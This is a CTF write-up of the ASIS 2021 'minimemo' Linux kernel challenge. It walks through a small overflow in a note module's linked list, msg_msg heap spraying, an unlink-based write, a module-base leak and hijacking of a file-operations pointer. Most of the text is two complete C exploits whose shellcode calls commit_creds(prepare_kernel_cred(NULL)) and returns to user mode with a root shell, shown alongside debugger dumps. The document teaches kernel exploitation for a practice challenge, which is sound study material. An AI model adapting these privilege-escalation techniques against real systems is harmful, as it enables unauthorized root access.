---
title: Kernel-minimemo-ASIS CTF Quals 2021
date: 2022-04-05 11:22:45
tags:
    - heap spray
    - queue message
    - kmalloc-64
---

### Description

* Files followed are given in attachment;

```shell
$ unzip minimemo.zip
$ tree .
.
├── minimemo
│   ├── bzImage
│   ├── minimemo.c
│   ├── pow.py
│   ├── rootfs.cpio
│   └── start-qemu.sh
└── minimemo.zip

1 directory, 6 files
```

* bzImage : `linux-5.14.3` compiled by `gcc:10.3.0`
* rootfs.cpio : Archive. `/etc/init.d/S99ctf` is the init script.
* minimemo.c : Kernel module 's source code.
* pow.py : Proof of work script.
* start-qemu : Shell script to run the kernel.
### Protection status

```shell
/ $ grep smap /proc/cpuinfo 
/ $ grep smep /proc/cpuinfo 
/ $ cat /proc/cmdline 
console=ttyS0 loglevel=3 oops=panic panic=-1 pti=off kaslr
/ $ cat /proc/sys/vm/unprivileged_userfaultfd 
0
```
* smap  : disable
* smep  : disable
* pti   : disable
* kaslr : enable
* unprivileged_userfaultfd : disable

### Vulnerabilty

```c
typedef struct {
  int id;
  char data[20];
} note_t;
typedef struct notelist_t {
  note_t note;
  struct notelist_t *fd;
  struct notelist_t *bk;
} notelist_t;
typedef struct {
  char data[20];
  int id;
  int size;
} request_t;
...
    case CMD_EDIT: {
      notelist_t *cur;
      for (cur = top.fd; cur != &top; cur = cur->fd) {
        if (req.id == cur->note.id) {
//---------------------check-------------------------------
          if (req.size < 0 || req.size >= NOTE_SIZE)
//---------------------check-------------------------------
            break;
//---------------------bug-------------------------------
          memcpy(cur->note.data, req.data, req.size);
//---------------------bug-------------------------------
          result = req.id;
          break;
        }
      }
      break;
    }
...
```

This segment is the memory of a note object, whose id ranges `0-4` , data ranges `0x5-0x18` , fd ranges `0x18-0x20`, and bk ranges `0x20-0x28`
```Bash
000:    0x0000000000000000      0x0000000000000000
010:    0x0000000000000000      0xffff888003292c80 <= fd
020:    0xffff888003292780      0x0000000000000000
030:    0x0000000000000000      0x0000000000000000
```
NOTE size is 0x18. To bypass the size check, you should control req.size <= 0x17, while note.data buffer is 0x14. It means you can overflow the buffer to change fd pointer by 3 bytes. 

What is not eazy is that, the function memcpy 's second argument src buf comes from the request struct, and the overflow part lands req's id filed. We can overflow the fd low bytes with request's id. But request's id is the note's id, the note's id is generate by `get_random_bytes(&new->note.id, sizeof(new->note.id));`. To defeat it, we should bruteforce the note's id, until id fits the bill.

------------

```c
  switch (cmd)
    {
    case CMD_NEW: {
      notelist_t *new = (notelist_t*)kzalloc(sizeof(notelist_t), GFP_ATOMIC);
      do {
        get_random_bytes(&new->note.id, sizeof(new->note.id));
      } while (new->note.id <= 0);
      new->fd = top.fd;
      new->bk = &top;
      top.fd->bk = new;
      top.fd = new;
      result = new->note.id;
      break;
    }
```
After debugging, the notes are allocated in kmalloc-64 slab somehow. Check the [cheetsheet](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/), perhaps we should connect heap spray and the bug to privilege escape.


### To exploit

* code the methods to add, delete, edit notes.

```c
static int add()
{
    request_t req;
    return ioctl(fd, CMD_NEW, &req);
}
static int del(unsigned long id)
{
    request_t req;
    req.id = id;
    return ioctl(fd, CMD_DEL, &req);
}
static int edit(int id, char *ptr, int len)
{
    request_t req;
    memcpy(req.data, ptr, len);
    req.id = id;
    req.size = len;
    return ioctl(fd, CMD_EDIT, &req);
}
```

* Allocate notes,and let them in a  continuous area. Maybe cus alloc and free in kernel init, the front object allocated in kamloc-64 is randomly. So clean the first part. The memo device has no limitaion on note number, so allocate some object in advance to ensure the next notes contiguous in memory.

```c
/* clean the unregularly freed objects in kmalloc-64 */
for(int i=0; i<0x12; i++)
{
    id[i] = add();
}
```

* Allocate notes like this.

```Bash
gef➤  x/8gx &top
0xffffffffc0002100 <top>:       0x0000000000000000      0x0000000000000000
0xffffffffc0002110 <top+16>:    0x0000000000000000      0xffff888003283c80  <= fd
0xffffffffc0002120 <top+32>:    0xffff8880032837c0      0x0000000000000000
0xffffffffc0002130:             0x0000000000000000      0x0000000000000000

gef➤  x/60gx 0xffff888003283c80-0x100
0xffff888003283b80:     0x000000002e9387b5      0x0000000000000000
0xffff888003283b90:     0x0000000000000000      0xffff888003283b40
0xffff888003283ba0:     0xffff888003283c40      0x0000000000000000
0xffff888003283bb0:     0x0000000000000000      0x0000000000000000
--------------------------------------------------------------------
0xffff888003283bc0:     0x0000000000000000      0x4242424242424242
0xffff888003283bd0:     0x4242424242424242      0x4242424242424242  <= spray area
0xffff888003283be0:     0x4242424242424242      0x4242424242424242
0xffff888003283bf0:     0x4242424242424242      0x4242424242424242
--------------------------------------------------------------------
0xffff888003283c00:     0x0000000000000000      0x4242424242424242
0xffff888003283c10:     0x4242424242424242      0x4242424242424242  <= spray area
0xffff888003283c20:     0x4242424242424242      0x4242424242424242
0xffff888003283c30:     0x4242424242424242      0x4242424242424242
--------------------------------------------------------------------
0xffff888003283c40:     0x00000000415e4e16 =id2 0x0000000000000000 
0xffff888003283c50:     0x0000000000000000      0xffff888003283b80  <= top->fd->fd
0xffff888003283c60:     0xffff888003283c80      0x0000000000000000
0xffff888003283c70:     0x0000000000000000      0x0000000000000000
--------------------------------------------------------------------
0xffff888003283c80:     0x000000006367e108 =id1 0x0000000000000000  
0xffff888003283c90:     0x0000000000000000      0xffff888003283c40  <= top->fd
0xffff888003283ca0:     0xffffffffc0002100      0x0000000000000000  
0xffff888003283cb0:     0x0000000000000000      0x0000000000000000
--------------------------------------------------------------------
0xffff888003283cc0:     0x0000000000000000      0x0000000000000000
0xffff888003283cd0:     0x0000000000000000      0x0000000000000000
0xffff888003283ce0:     0xffff888003283d00      0x0000000000000000
0xffff888003283cf0:     0x0000000000000000      0x0000000000000000
```
```c
    /* heap spray */
    int sz = 0x1000-0x30 + 0x40-0x8;
    char *buf = malloc(sz);
    memset(buf, '\x41', 0x1000-0x30);
    memset(buf+0x1000-0x30, '\x42', 0x40-0x8);
    send_msg(qid, buf, sz);
    send_msg(qid, buf, sz);

    int id1, id2;
    id2 = add();
    /* bruteforce LSB(Least Significant Byte) of id */
    while(1)
    {
        id1 = add();
        if((id1&0xff) == 0x08)
            break;
        del(id1);  
    }
```
Bruteforce id1 LSB equals 0x8, cuz I want to overflow id1's fd pointer from `0xffff888003283c40` to `0xffff888003283c08` by one byte. It's clear that `0xffff888003283c08` points the spray area, which can be read and write in user space.

* Edit the id1, and overflow it's fd pointer.

```c
char tmp[0x14];
memset(tmp, 'C', 0x14);
edit(id1, tmp, 0x14+1);
```

```Bash
gef➤  x/8gx 0xffff888003283c80
0xffff888003283c80:     0x434343436367e108      0x4343434343434343
0xffff888003283c90:     0x4343434343434343      0xffff888003283c08
0xffff888003283ca0:     0xffffffffc0002100      0x0000000000000000
0xffff888003283cb0:     0x0000000000000000      0x0000000000000000
```
* delete id1.

```c
    case CMD_DEL: {
      notelist_t *cur;
      for (cur = top.fd; cur != &top; cur = cur->fd) {
        if (req.id == cur->note.id) {
    //----------------------------
          cur->bk->fd = cur->fd;
          cur->fd->bk = cur->bk;
    //----------------------------
          kfree(cur);
          result = req.id;
          break;
        }
```
`cur->bk->fd = cur->fd;`, then `top.fd = 0xffff888003283c08`,`cur->fd->bk = cur->bk;`, then `*(0xffff888003283c08+0x20) = 0xffffffffc0002100`.

```Bash
gef➤  x/8gx &top
0xffffffffc0002100 <top>:       0x0000000000000000      0x0000000000000000
0xffffffffc0002110 <top+16>:    0x0000000000000000      0xffff888003283c08
0xffffffffc0002120 <top+32>:    0xffff8880032836c0      0x0000000000000000
0xffffffffc0002130:             0x0000000000000000      0x0000000000000000
gef➤  x/8gx 0xffff888003283c08
0xffff888003283c08:     0x4242424242424242      0x4242424242424242
0xffff888003283c18:     0x4242424242424242      0x4242424242424242
0xffff888003283c28:     0xffffffffc0002100      0x4242424242424242
0xffff888003283c38:     0x4242424242424242      0x00000000535d3799
```

* leak the module base via msgrvc.

```c
stop("leak via spray");
receive_msg(qid, buf, sz);
receive_msg(qid, buf, sz);
m_base = *(uint64_t*)(&buf[0xff0]) - 0x2100;
printf("[*] m_base => 0x%llx \n", m_base);
/* output:
[*] m_base => 0xffffffffc0000000 
*/
```

* reallocate this region and forge a fake note whose fake.date filed lands module fops. Modify `fops->close` function pointer and hijack control flow.

```c
notelist_t *fake = (notelist_t*)(buf+0xfd0);
fake->note.id = 0xcafebabe;
fake->fd = (void*)(m_base+0x2000+128-4);
fake->bk = (void*)(m_base+0x2000);
stop("forge a fake note");
send_msg(qid, buf, sz);
```

```Bash
gef➤  x/8gx &top
0xffffffffc0002100 <top>:       0x0000000000000000      0x0000000000000000
0xffffffffc0002110 <top+16>:    0x0000000000000000      0xffff888003280c08
0xffffffffc0002120 <top+32>:    0xffff8880032805c0      0x0000000000000000
0xffffffffc0002130:     0x0000000000000000      0x0000000000000000
gef➤  x/8gx 0xffff888003283c08
0xffff888003283c08:     0x42424242cafebabe      0x4242424242424242
0xffff888003283c18:     0x4242424242424242      0xffffffffc000207c
0xffff888003283c28:     0xffffffffc0002000      0x4242424242424242
0xffff888003283c38:     0x4242424242424242      0x0000000015443dfc
gef➤  x/8gx 0xffffffffc000207c
0xffffffffc000207c <module_fops+124>:   0x0000000000000000 =id  0x0000000000000000
0xffffffffc000208c <module_fops+140>:   0x0000000000000000      0x0000000000000000
0xffffffffc000209c <module_fops+156>:   0x0000000000000000      0x0000000000000000
0xffffffffc00020ac <module_fops+172>:   0x0000000000000000      0x0000000000000000
```
id of fake note  is 0, edit the note .

```c
memset(tmp, '\x00', 20);
*(uint64_t*)(&tmp) = (uint64_t)shellcode;
edit(0, tmp, 20);
```

```Bash
gef➤  x/8gx 0xffffffffc000207c
0xffffffffc000207c <module_fops+124>:   0x0040223c00000000      0x0000000000000000
0xffffffffc000208c <module_fops+140>:   0x0000000000000000      0x0000000000000000
0xffffffffc000209c <module_fops+156>:   0x0000000000000000      0x0000000000000000
0xffffffffc00020ac <module_fops+172>:   0x0000000000000000      0x0000000000000000
gef➤  p *(struct file_operations*)(&module_fops)
$1 = {
  owner = 0xffffffffc0002140,
  llseek = 0x0,
  read = 0x0,
  write = 0x0,
  unlocked_ioctl = 0xffffffffc0000000 <module_ioctl>,
  release = 0x40223c,
...
```

* Hijack control flow, and call `commit_creds(prepare_kernel_cred(NULL))`, then return to uermode.

```c
gef➤  x/gx 0xffffffffc0000000+0x2148
0xffffffffc0002148:     0xffffffff81ea9e80
gef➤  x/i 0xffffffff81ea9e80-0xea9e80
   0xffffffff81000000 <startup_64>:     lea    rsp,[rip+0xe03f51]
```

```c
void shellcode()
{
/*
ffffffff81070860 T commit_creds
ffffffff810709f0 T prepare_kernel_cred
*/
    asm
    (
        /* defeat kalsr */
        "mov rdi, %1 \n"
        "add rdi, 0x2148 \n"
        "mov rdi, qword ptr [rdi] \n"
        "sub rdi, 0xea9e80 \n"
        "mov %0, rdi \n"
        
        /* commit_creds(prepare_kernel_cred(NULL)) */
        "mov rax, %2 \n"
        "add rax, 0x709f0 \n"
        "xor rdi, rdi \n"
        "call rax \n"
        "mov rdi, rax \n"
        "mov rax, %2 \n"
        "add rax, 0x70860 \n"
        "call rax \n"

        :"=m"(k_base)
        :"m"(m_base), "m"(k_base)
        :"rdi", "rax"    
    );
    asm
    (
        /* return to usermode */
        "push %4 \n"
        "push %3 \n"
        "push %2 \n"
        "push %1 \n"
        "push %0 \n"
        "swapgs \n"
        "iretq \n"
        "ret"
        :
        :"r"(shell), "m"(user_cs), "m"(user_rflags), "m"(user_sp), "m"(user_ss)
        :"memory"
    );
}
```

### Final exp

```c
//hepl.h
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>


static void shell() 
{
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    if(getuid() == 0)
    {
        puts("[*] Get root shell ");
        execve("/bin/sh", argv, envp);
    }
}


/* heap spray parts */
struct msgbuf_ {
    long mtype;
    char mtext[0x2000];
};

static void
send_msg(int qid, char* buf, int len)
{
    struct msgbuf_ msg;
    msg.mtype = 1;
    memcpy(msg.mtext, buf, len);

    if (msgsnd(qid, &msg, len,IPC_NOWAIT) == -1) 
    {
        perror("msgsnd error");
        exit(EXIT_FAILURE);
    }
    printf("message sent \n");
}
static int
receive_msg(int qid, char* buf, int len)
{
    struct msgbuf_ msg;

    if (msgrcv(qid, &msg, len, 1, MSG_NOERROR | IPC_NOWAIT) == -1) 
    {
        if (errno != ENOMSG) 
        {
            perror("msgrcv");
            exit(EXIT_FAILURE);
        }
        printf("No message available for msgrcv()\n");
        return 1;
    } 
    else
    {
        memcpy(buf, msg.mtext, len);
        return 0;
    }
}
static int new_msg()
{
    int qid;
    qid = msgget(0x42, IPC_CREAT | 0666);
    if (qid == -1) 
    {
        perror("msgget");
        exit(EXIT_FAILURE);
    }
    return qid;
}

/* dump a chunk oof memory */
void hexdump(uint8_t* buffer, int num_bytes) 
{
    for(int i=0; i<num_bytes; i+=0x10)
    {
        printf("%06x |", i);
        for (int j = 0; j < 0x10; j++) 
        {
            if (j % 8 == 0)
                printf(" ");
            if (i < num_bytes)
                printf(" %02x", buffer[i+j]);
            else
                printf("   ");
        }
        printf("\n");
    }
}

```

```c
//exp.c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "help.h"

#define mkstr(name) #name

#define stop(msg)    { write(1, msg, strlen(msg)); getchar(); }
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)


/*************************header***************************/

#define DEVICE_NAME "memo"
#define NOTE_SIZE sizeof(note_t)
#define CMD_NEW  0x11451401
#define CMD_EDIT 0x11451402
#define CMD_DEL  0x11451403

typedef struct {
    int id;
    char data[20];
} note_t;

typedef struct notelist_t {
    note_t note;
    struct notelist_t *fd;
    struct notelist_t *bk;
} notelist_t;

typedef struct {
    char data[20];
    int id;
    int size;
} request_t;

struct msgbuf {
    long mtype;
    char mtext[0x1000-0x30 + 0x40-0x8];
};

/*************************header***************************/


/*************************global var***************************/

int fd;
int qid;
uint64_t m_base;
uint64_t k_base;
uint64_t modprobe_path;
uint64_t user_cs, user_ss, user_sp, user_rflags, PC;

/*************************global var***************************/

/*************************LKM ops***************************/

static int add()
{
    request_t req;
    return ioctl(fd, CMD_NEW, &req);
}
static int del(unsigned long id)
{
    request_t req;
    req.id = id;
    return ioctl(fd, CMD_DEL, &req);
}
static int edit(int id, char *ptr, int len)
{
    request_t req;
    memcpy(req.data, ptr, len);
    req.id = id;
    req.size = len;
    return ioctl(fd, CMD_EDIT, &req);
}

/*************************LKM ops***************************/
void shellcode()
{
/*
ffffffff81070860 T commit_creds
ffffffff810709f0 T prepare_kernel_cred
*/
    asm
    (
        /* defeat kalsr */
        "mov rdi, %1 \n"
        "add rdi, 0x2148 \n"
        "mov rdi, qword ptr [rdi] \n"
        "sub rdi, 0xea9e80 \n"
        "mov %0, rdi \n"
        
        /* commit_creds(prepare_kernel_cred(NULL)) */
        "mov rax, %2 \n"
        "add rax, 0x709f0 \n"
        "xor rdi, rdi \n"
        "call rax \n"
        "mov rdi, rax \n"
        "mov rax, %2 \n"
        "add rax, 0x70860 \n"
        "call rax \n"

        :"=m"(k_base)
        :"m"(m_base), "m"(k_base)
        :"rdi", "rax"    
    );
    asm
    (
        /* return to usermode */
        "push %4 \n"
        "push %3 \n"
        "push %2 \n"
        "push %1 \n"
        "push %0 \n"
        "swapgs \n"
        "iretq \n"
        "ret"
        :
        :"r"(shell), "m"(user_cs), "m"(user_rflags), "m"(user_sp), "m"(user_ss)
        :"memory"
    );
}


static void save_status()
{
  __asm__ __volatile__
        ( "mov %0, cs;"
          "mov %1, ss;"
          "mov %2, rsp;"
          "pushfq;"
          "popq %3;"
          : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
          :
          : "memory");
  puts("[*] status has been saved.");
}

int
main(int argc, char *argv[])
{
    save_status();
    
    qid = new_msg();
    fd = open("/dev/memo", 2);  assert(fd > 0);
    int id[0x20];

    /* clean the unregularly freed objects in kmalloc-64 */
    for(int i=0; i<0x12; i++)
    {
        id[i] = add();
    }

    /* begin to exploit */
    int sz = 0x1000-0x30 + 0x40-0x8;
    char *buf = malloc(sz);
    memset(buf, '\x41', 0x1000-0x30);
    memset(buf+0x1000-0x30, '\x42', 0x40-0x8);
    stop("begin to spray");
    send_msg(qid, buf, sz);
    send_msg(qid, buf, sz);
    
    stop("begin to alloc note ");
    int id1, id2;
    id2 = add();
    while(1)
    {
        id1 = add();
        if((id1&0xff) == 0x08)
            break;
        del(id1);  
    }~
    printf("%s => 0x%x \n", mkstr(id1), id1);
    printf("%s => 0x%x \n", mkstr(id2), id2);

    stop("overflow and delete");
    char tmp[0x14];
    memset(tmp, 'C', 0x14);
    edit(id1, tmp, 0x14+1);
    del(id1);

    stop("leak via spray");
    receive_msg(qid, buf, sz);
    receive_msg(qid, buf, sz);
    // hexdump(buf, sz);
    m_base = *(uint64_t*)(&buf[0xff0]) - 0x2100;
    printf("[*] m_base => 0x%llx \n", m_base);

    /* forge the note frame which points to module ops struct in bss seg */
    notelist_t *fake = (notelist_t*)(buf+0xfd0);
    fake->note.id = 0xcafebabe;
    fake->fd = (void*)(m_base+0x2000+128-4);
    fake->bk = (void*)(m_base+0x2000);
    stop("forge a fake note");
    send_msg(qid, buf, sz);

    memset(tmp, '\x00', 20);
    *(uint64_t*)(&tmp) = (uint64_t)shellcode;
    edit(0, tmp, 20);

    printf("[*] shellcode => %p \n", shellcode);
    stop("trigger");
    close(fd);
}
```


### Another exp

* Cuz smap, smep, kti are disable, so fd can be modified to pointer in uerspace . It means you can skip the heap spray and replace it with a user space buffer . Then likewise , leak the module and forge fake note in uerspace.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "help.h"

#define mkstr(name) #name

#define stop(msg)    { write(1, msg, strlen(msg)); getchar(); }
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)


/*************************header***************************/

#define DEVICE_NAME "memo"
#define NOTE_SIZE sizeof(note_t)
#define CMD_NEW  0x11451401
#define CMD_EDIT 0x11451402
#define CMD_DEL  0x11451403

typedef struct {
    int id;
    char data[20];
} note_t;

typedef struct notelist_t {
    note_t note;
    struct notelist_t *fd;
    struct notelist_t *bk;
} notelist_t;

typedef struct {
    char data[20];
    int id;
    int size;
} request_t;

struct msgbuf {
    long mtype;
    char mtext[0x1000-0x30 + 0x40-0x8];
};

/*************************header***************************/


/*************************global var***************************/

int fd;
int qid;
uint64_t m_base;
uint64_t k_base;
uint64_t modprobe_path;
uint64_t user_cs, user_ss, user_sp, user_rflags, PC;

/*************************global var***************************/

/*************************LKM ops***************************/

static int add()
{
    request_t req;
    return ioctl(fd, CMD_NEW, &req);
}
static int del(unsigned long id)
{
    request_t req;
    req.id = id;
    return ioctl(fd, CMD_DEL, &req);
}
static int edit(int id, char *ptr, int len)
{
    request_t req;
    memcpy(req.data, ptr, len);
    req.id = id;
    req.size = len;
    return ioctl(fd, CMD_EDIT, &req);
}

/*************************LKM ops***************************/
void shellcode()
{
/*
ffffffff81070860 T commit_creds
ffffffff810709f0 T prepare_kernel_cred
*/
    asm
    (
        /* defeat kalsr */
        "mov rdi, %1 \n"
        "add rdi, 0x2148 \n"
        "mov rdi, qword ptr [rdi] \n"
        "sub rdi, 0xea9e80 \n"
        "mov %0, rdi \n"
        
        /* commit_creds(prepare_kernel_cred(NULL)) */
        "mov rax, %2 \n"
        "add rax, 0x709f0 \n"
        "xor rdi, rdi \n"
        "call rax \n"
        "mov rdi, rax \n"
        "mov rax, %2 \n"
        "add rax, 0x70860 \n"
        "call rax \n"

        :"=m"(k_base)
        :"m"(m_base), "m"(k_base)
        :"rdi", "rax"    
    );
    asm
    (
        /* return to usermode */
        "push %4 \n"
        "push %3 \n"
        "push %2 \n"
        "push %1 \n"
        "push %0 \n"
        "swapgs \n"
        "iretq \n"
        "ret"
        :
        :"r"(shell), "m"(user_cs), "m"(user_rflags), "m"(user_sp), "m"(user_ss)
        :"memory"
    );
}


static void save_status()
{
  __asm__ __volatile__
        ( "mov %0, cs;"
          "mov %1, ss;"
          "mov %2, rsp;"
          "pushfq;"
          "popq %3;"
          : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
          :
          : "memory");
  puts("[*] status has been saved.");
}

static void *alloc_stack(void *rsp)
{
    void * ret;
    ret = mmap(((char*)(rsp) - 4*0x1000),6*0x1000,7,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(ret == MAP_FAILED) 
        errExit("mmap");
    memset(ret, 0, 6*0x1000); /* avoid page fault */
    return ret;    
}

int
main(int argc, char *argv[])
{
    save_status();
    
    /* prepare a buffer in uerspace */
    uint8_t* addr = (void *)(1ull<<31);
    alloc_stack(addr);

    fd = open("/dev/memo", 2);  assert(fd > 0);
    int id[0x20];

    /* clean the unregularly freed objects in kmalloc-64 */
    for(int i=0; i<0x13; i++)
    {
        id[i] = add();
    }

    /* begin to exploit */
    stop("begin to alloc note ");
    int id1, id2;
    id2 = add();
    while(1)
    {
        id1 = add();
        if((id1&0xff) == 0x54)
            break;
        del(id1);
    }
    printf("%s => 0x%x \n", mkstr(id1), id1);
    printf("%s => 0x%x \n", mkstr(id2), id2);

    stop("overflow and delete");
    char tmp[0x14];
    memset(tmp, '\x43', 0x10);
    memset(tmp+0x10, '\x44', 0x4);
    edit(id1, tmp, 0x14+1);

    memset(tmp, '\x00', 0x14);
    *(void**)(tmp) = addr;
    edit(0x44444444, tmp, 0x8);
    del(id1);
    m_base = *(uint64_t*)(&addr[0x20]) - 0x2100;
    printf("[*] m_base => 0x%llx \n", m_base);


    notelist_t *fake = (notelist_t*)(addr);
    fake->note.id = 0xcafebabe;
    fake->fd = (void*)(m_base+0x2000+128-4);
    fake->bk = (void*)(m_base+0x2000);
    // hexdump(addr, 0x100);

    stop("hijack");
    memset(tmp, '\x00', 20);
    *(uint64_t*)(&tmp) = (uint64_t)shellcode;
    edit(0, tmp, 20);
    close(fd);
}
```
